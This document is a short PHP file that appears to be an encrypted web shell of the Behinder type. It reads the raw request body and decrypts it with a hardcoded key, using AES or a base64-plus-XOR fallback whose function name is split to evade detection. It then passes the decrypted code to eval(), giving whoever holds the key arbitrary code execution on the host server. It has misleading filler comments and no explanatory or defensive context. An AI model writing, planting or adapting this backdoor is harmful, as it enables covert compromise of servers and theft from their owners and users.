<?php
/* begin */
@error_reporting(0);
/* to the job */
session_start();
    /* for key */
    $key="c24c5bb0b768d52c";
	$_SESSION['k']=$key;
	/* foe files */
	$post=file_get_contents("php://input");
	/* load that */
	if(!extension_loaded('openssl'))
	{
		$t="bas"."e6_"."4dec"."ode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
	/* just do it ! */
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	/* come on */
	class C{public function __invoke($p) {eval($p."");}}
	/* gogogo */
    @call_user_func(new C(),$params);
	/* for funs */
?>